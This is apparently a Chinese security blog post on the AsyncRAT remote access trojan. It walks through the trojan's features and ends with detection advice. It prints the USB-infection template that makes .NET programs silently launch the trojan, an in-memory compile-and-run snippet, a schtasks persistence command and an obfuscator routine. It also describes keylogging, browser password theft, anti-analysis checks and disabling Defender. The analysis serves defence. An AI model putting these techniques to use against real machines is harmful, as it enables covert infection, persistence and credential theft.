@@ -1,0 +1,455 @@
+I"�?<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p><a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">AsyncRAT</a>是一款使用C Sharp开发的C2工具，本文仅在技术研究的角度分析AsyncRAT的技术细节，介绍检测方法。</p>
+
+<p><strong>注：</strong></p>
+
+<p>本文选择的AsyncRAT更新日期为2020年5月9日</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<ul>
+  <li>AsyncRAT的优点</li>
+  <li>AsyncRAT的技术细节</li>
+  <li>检测方法</li>
+</ul>
+
+<h2 id="0x02-asyncrat的优点">0x02 AsyncRAT的优点</h2>
+<hr />
+
+<p><a href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp">AsyncRAT</a>使用C Sharp开发，应用于Windows系统，具有以下优点:</p>
+
+<ol>
+  <li>支持从Pastebin.com读取C2服务器的配置信息</li>
+  <li>支持内存加载PE文件</li>
+  <li>支持动态编译并执行C#或者VB代码</li>
+  <li>支持U盘感染，能够感染U盘中所有使用.NET开发的exe文件</li>
+  <li>支持自动读取Firefox和Chrome浏览器中保存的密码</li>
+  <li>通过欺骗用户点击的方式绕过UAC进行提权</li>
+  <li>通过C#接口技术，提高程序的扩展性，在程序实现上将每一个功能对应一个类，编译成dll文件，在需要加载的时候，由Server发送至Client，Client通过Activator.CreateInstance将类实例化，进而调用类的方法。</li>
+</ol>
+
+<h2 id="0x03-asyncrat的技术细节">0x03 AsyncRAT的技术细节</h2>
+<hr />
+
+<p>本节按照AsyncRAT控制面板上的功能逐个进行分析，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-8-20/2-1.png" alt="Alt text" /></p>
+
+<h3 id="1sendfile">1.SendFile</h3>
+
+<p>(1)ToMemory</p>
+
+<p>内存加载exe文件，支持以下两种类型:</p>
+
+<ol>
+  <li>Reflection</li>
+</ol>
+
+<p>使用Assembly.Load加载C#程序</p>
+
+<p>更多细节可参考之前的文章<a href="https://3gstudent.github.io/%E4%BB%8E%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD.NET%E7%A8%8B%E5%BA%8F%E9%9B%86(Assembly.Load)%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《从内存加载.NET程序集(Assembly.Load)的利用分析》</a></p>
+
+<ol>
+  <li>RunPE</li>
+</ol>
+
+<p>通过替换进程内存的方式加载exe文件</p>
+
+<p>可选择以下程序作为被注入的程序：</p>
+
+<ul>
+  <li>aspnet_compiler.exe</li>
+  <li>RegAsm.exe</li>
+  <li>MSBuild.exe</li>
+  <li>RegSvcs.exe</li>
+  <li>vbc.exe</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>以上5个exe文件位于Microsoft.NET Framework的安装目录，同AsyncClient.exe的位数保持一致</p>
+
+<p>使用32位的AsyncClient.exe反弹回的Session，默认会寻找32位Microsoft.NET Framework的安装目录，例如：C:\Windows\Microsoft.NET\Framework\v4.0.30319</p>
+
+<p>使用64位的AsyncClient.exe反弹回的Session，默认会寻找64位Microsoft.NET Framework的安装目录，例如：C:\Windows\Microsoft.NET\Framework64\v4.0.30319</p>
+
+<p>RunPE操作将启动以上5个exe文件中的一个，通过ReadProcessMemory、VirtualAllocEx、WriteProcessMemory和ResumeThread实现对进程内存的修改，替换成要加载的exe文件</p>
+
+<p>这里需要注意要加载的exe文件需要同AsyncClient.exe的位数保持一致</p>
+
+<p>使用32位的AsyncClient.exe反弹回的Session，使用RunPE操作只能加载32位的exe文件</p>
+
+<p>使用64位的AsyncClient.exe反弹回的Session，使用RunPE操作只能加载64位的exe文件</p>
+
+<p>更多细节可参考之前的文章<a href="https://3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B">《傀儡进程的实现与检测》</a></p>
+
+<p>(2)ToDisk</p>
+
+<p>将exe文件上传到目标主机的<code class="language-plaintext highlighter-rouge">%Temp%</code>目录，重命名为随机字符串，再使用Powershell启动exe文件，执行后不会删除<code class="language-plaintext highlighter-rouge">%Temp%</code>目录下的exe文件</p>
+
+<h3 id="2-monitoring">2. Monitoring</h3>
+
+<p>(1)Remote Desktop</p>
+
+<p>监控屏幕，实时获得目标桌面的内容(只能监控，无法操作)</p>
+
+<p>调用Graphics类的CopyFromScreen实现屏幕截图</p>
+
+<p>通过Python实现监控屏幕的细节可参考之前的文章<a href="https://3gstudent.github.io/Pupy%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90-Windows%E5%B9%B3%E5%8F%B0%E4%B8%8B%E7%9A%84%E5%B1%8F%E5%B9%95%E6%8E%A7%E5%88%B6">《Pupy利用分析——Windows平台下的屏幕控制》</a></p>
+
+<p>(2)Keylogger</p>
+
+<p>实时获得目标主机键盘输入的消息和进程名称</p>
+
+<p>通过hook的方式实现键盘记录</p>
+
+<p>(3)Password Recovery</p>
+
+<p>获得Firefox和Chrome浏览器中保存的密码</p>
+
+<p>技术细节可参考之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAFirefox%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">《渗透技巧——导出Firefox浏览器中保存的密码》</a>和<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81">《渗透技巧——导出Chrome浏览器中保存的密码》</a></p>
+
+<p>(4)File Manager</p>
+
+<p>文件管理，还支持隐蔽安装7zip和对文件的压缩及解压缩</p>
+
+<p>隐蔽安装7zip的方式：</p>
+
+<p>在<code class="language-plaintext highlighter-rouge">%Temp%</code>目录新建文件夹7-Zip，释放文件7z.exe和7z.dll</p>
+
+<p>(5)Process Manager</p>
+
+<p>进程管理，支持查看进程和关闭进程</p>
+
+<p>(6)Report Window</p>
+
+<p>监控重要进程，当目标主机上运行指定进程时，控制端弹出提示消息</p>
+
+<p>(7)Webcam</p>
+
+<p>开启摄像头</p>
+
+<h3 id="3miscellaneous">3.Miscellaneous</h3>
+
+<p>(1)Bots Killer</p>
+
+<p>清除自身进程在注册表HKLM和HKCU下<code class="language-plaintext highlighter-rouge">\Software\Microsoft\Windows\CurrentVersion\Run</code>和<code class="language-plaintext highlighter-rouge">Software\Microsoft\Windows\CurrentVersion\RunOnce</code>保存的项</p>
+
+<p>(2)USB Spread</p>
+
+<p>当目标主机连接U盘时，感染U盘中的文件</p>
+
+<p>将木马客户端复制到U盘中并隐藏，默认保存的名称为LimeUSB.exe</p>
+
+<p>修改U盘中所有使用.NET开发的exe文件，通过CSharpCodeProvider改变程序运行流程，添加以下代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Diagnostics;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTrademark("%Lime%")]
+[assembly: Guid("%Guid%")]
+
+static class %LimeUSBModule%
+{
+    public static void Main()
+    {
+        try
+        {
+            System.Diagnostics.Process.Start(@"%File%");
+        }
+        catch { }
+        try
+        {
+            System.Diagnostics.Process.Start(@"%Payload%");
+        }
+        catch { }
+    }
+}
+</code></pre></div></div>
+
+<p>用户在启动正常文件的同时会隐蔽执行U盘中的木马客户端</p>
+
+<p>(3)Seed Torrent</p>
+
+<p>向目标主机发送种子文件并下载</p>
+
+<p>目标主机需要安装uTorrent或者BitTorrent</p>
+
+<p>(4)Remote Shell</p>
+
+<p>弹出一个交互式的cmd窗口</p>
+
+<p>(5)DOS Attack</p>
+
+<p>向指定域名持续发送HTTP数据包</p>
+
+<p>(6)Execute .NET Code</p>
+
+<p>在目标主机上动态编译C#或者VB代码并执行</p>
+
+<p>模板文件包含弹框和下载执行的功能</p>
+
+<p>我提取出了其中编译C#代码并执行的功能，代码示例如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.CodeDom;
+using System.CodeDom.Compiler;
+using System.Reflection;
+namespace CodeDomProviderTest
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string source = @"
+using System;
+using System.Windows.Forms;
+namespace AsyncRAT
+{
+    public class Program
+    {
+        public static void Main(string[] args)
+        {
+            try
+            {
+                MessageBox.Show(""Hello World"");
+            }
+            catch { }
+        }
+}
+}";
+            CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");  
+            try
+            {              
+                var compilerOptions = "/target:winexe /platform:anycpu /optimize-";
+
+                var compilerParameters = new CompilerParameters();
+                compilerParameters.ReferencedAssemblies.Add("system.dll");
+                compilerParameters.ReferencedAssemblies.Add("system.windows.forms.dll");
+                compilerParameters.GenerateExecutable = true;
+                compilerParameters.GenerateInMemory = true;
+                compilerParameters.CompilerOptions = compilerOptions;
+                compilerParameters.TreatWarningsAsErrors = false;
+                compilerParameters.IncludeDebugInformation = false;
+
+                var compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, source);
+                if (compilerResults.Errors.Count &gt; 0)
+                {
+                    foreach (CompilerError compilerError in compilerResults.Errors)
+                    {
+                        Console.WriteLine(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
+                            compilerError.Line, compilerError.Column, compilerError.FileName));
+                        break;
+                    }
+                }
+                else
+                {
+                    Assembly assembly = compilerResults.CompiledAssembly;
+                    MethodInfo methodInfo = assembly.EntryPoint;
+                    object injObj = assembly.CreateInstance(methodInfo.Name);
+                    object[] parameters = new object[1];
+                    if (methodInfo.GetParameters().Length == 0)
+                    {
+                        parameters = null;
+                    }
+                    methodInfo.Invoke(injObj, parameters);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>(7)Files Searcher</p>
+
+<p>搜索指定后缀名的文件并打包成zip文件</p>
+
+<h3 id="4extra">4.Extra</h3>
+
+<p>(1)Visit Website</p>
+
+<p>启动默认浏览器并访问指定URL，界面不隐藏</p>
+
+<p>(2)Send MessageBox</p>
+
+<p>在目标主机上弹出对话框</p>
+
+<p>(3)Chat</p>
+
+<p>在目标主机上弹出对话框，实时显示输入的内容</p>
+
+<p>(4)Get Admin Privileges</p>
+
+<p>使用cmd.exe以Admin权限重新启动木马客户端，这个操作会在用户桌面弹出UAC框，需要用户选择允许后才能运行</p>
+
+<p>如果用户未选择允许，会一直弹出UAC对话框</p>
+
+<p>UAC对话框的程序位置会暴露木马客户端的路径</p>
+
+<p>如果想要伪造一个更加可信的UAC对话框(不暴露程序位置)可以参考之前文章《A dirty way of tricking users to bypass UAC》中的思路</p>
+
+<p>(5)Blank Screen</p>
+
+<p>Run功能：</p>
+
+<p>通过WinAPI CreateDesktop()创建一个随机名称的虚拟桌面，内容为空，当切换到这个空的虚拟桌面时，用户无法对桌面进行操作</p>
+
+<p>Stop功能：</p>
+
+<p>通过WinAPI SwitchDesktop()切换到原来的桌面</p>
+
+<p>(6)Disable Windows Defender</p>
+
+<p>通过修改注册表的方式关闭Windows Defender，通常在Win10系统上使用</p>
+
+<p>(7)Set Wallpaper</p>
+
+<p>设置用户的桌面</p>
+
+<h3 id="5server">5.Server</h3>
+
+<p>Block Clients</p>
+
+<p>拒绝指定IP回连的木马客户端</p>
+
+<h3 id="6builder">6.Builder</h3>
+
+<p>(1)Connection</p>
+
+<p>DNS：指定C2 Server的IP，可以设置多个</p>
+
+<p>Port：指定C2 Server的端口，可以设置多个</p>
+
+<p>Pastebin：从Pastebin.com读取C2 Server的信息，包括DNS和Port</p>
+
+<p>内容示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1:6606:7707:8808
+</code></pre></div></div>
+
+<p>(2)Install</p>
+
+<p>用作配置木马客户端自启动的功能</p>
+
+<p>开启这个功能后会将木马客户端复制到指定位置</p>
+
+<p>文件名称可以重新命名</p>
+
+<p>文件路径可选择<code class="language-plaintext highlighter-rouge">%AppData%</code>或<code class="language-plaintext highlighter-rouge">%Temp%</code>目录</p>
+
+<p>当木马客户端以普通用户权限执行时，会在注册表<code class="language-plaintext highlighter-rouge">HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>添加项，以新的木马客户端名称作为注册表项的名称，以新的木马客户端路径作为注册表项的数据</p>
+
+<p>当木马客户端以管理员权限执行时，会使用schtasks命令创建计划任务，命令示例：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /f /sc onlogon /rl highest /tn &lt;name&gt; /tr &lt;path&gt;
+</code></pre></div></div>
+
+<p>计划任务的名称为新的木马客户端名称，会在用户登录时执行计划任务</p>
+
+<p>(3)Misc</p>
+
+<p>Group：对木马客户端进行分类</p>
+
+<p>Mutex：设置互斥量，避免木马客户端的重复启动</p>
+
+<p>Anti Analysis：</p>
+
+<p>包括以下功能：</p>
+
+<ul>
+  <li>DetectManufacturer，通过WMI获得系统信息(<code class="language-plaintext highlighter-rouge">Select * from Win32_ComputerSystem</code>)，查看Manufacturer是否包含字符VIRTUAL、vmware或VirtualBox</li>
+  <li>DetectDebugger，使用WinApi CheckRemoteDebuggerPresent()检查是否为调试器</li>
+  <li>DetectSandboxie，使用WinApi GetModuleHandle()检查SbieDll.dll是否存在</li>
+  <li>IsSmallDisk，检查硬盘大小是否小于60Gb</li>
+  <li>IsXP，检查系统名称是否包含字符xp</li>
+</ul>
+
+<p>Process Critica：</p>
+
+<p>将进程设置为保护进程，如果意外关闭了保护进程，那么将导致BSOD</p>
+
+<p>更多细节可参考之前的文章<a href="https://3gstudent.github.io/%E7%BB%93%E6%9D%9F%E8%BF%9B%E7%A8%8B%E5%AF%BC%E8%87%B4BSOD%E7%9A%84%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《结束进程导致BSOD的利用分析》</a></p>
+
+<p>Delay：延迟执行的时间</p>
+
+<p>(4)Assembly</p>
+
+<p>可以手动设置文件属性，也可以复制指定文件的文件属性</p>
+
+<p>(5)Icon</p>
+
+<p>设置文件图标</p>
+
+<p>(6)Build</p>
+
+<p>Simple Obfuscator：通过重命名的方式实现简单的混淆</p>
+
+<p>关键代码：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>       private static ModuleDefMD RenamingObfuscation(ModuleDefMD inModule)
+        {
+            ModuleDefMD module = inModule;
+            IRenaming rnm = new NamespacesRenaming();
+            module = rnm.Rename(module);
+            rnm = new ClassesRenaming();
+            module = rnm.Rename(module);
+            rnm = new MethodsRenaming();
+            module = rnm.Rename(module);
+            rnm = new PropertiesRenaming();
+            module = rnm.Rename(module);
+            rnm = new FieldsRenaming();
+            module = rnm.Rename(module);
+            return module;
+        }
+    }
+</code></pre></div></div>
+
+<h2 id="0x04-检测方法">0x04 检测方法</h2>
+<hr />
+
+<p>1.查找可疑文件</p>
+
+<p>路径：<code class="language-plaintext highlighter-rouge">%AppData%</code>和<code class="language-plaintext highlighter-rouge">%Temp%</code>目录</p>
+
+<p>2.使用Autoruns检查可疑的启动项</p>
+
+<p>(1)注册表位置</p>
+
+<ul>
+  <li>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</li>
+  <li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</li>
+</ul>
+
+<p>(2)计划任务列表</p>
+
+<p>3.后台可疑进程</p>
+
+<p>AsyncRAT的木马客户端只有exe文件一种形式，在运行时会产生可疑的进程</p>
+
+<p>4.通信流量</p>
+
+<p>查看可疑进程对外通信流量</p>
+
+<p>5.使用杀毒软件</p>
+
+<p>目前杀毒软件均会对AsyncRAT进行拦截</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文在技术研究的角度分析AsyncRAT的技术细节，介绍检测方法。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
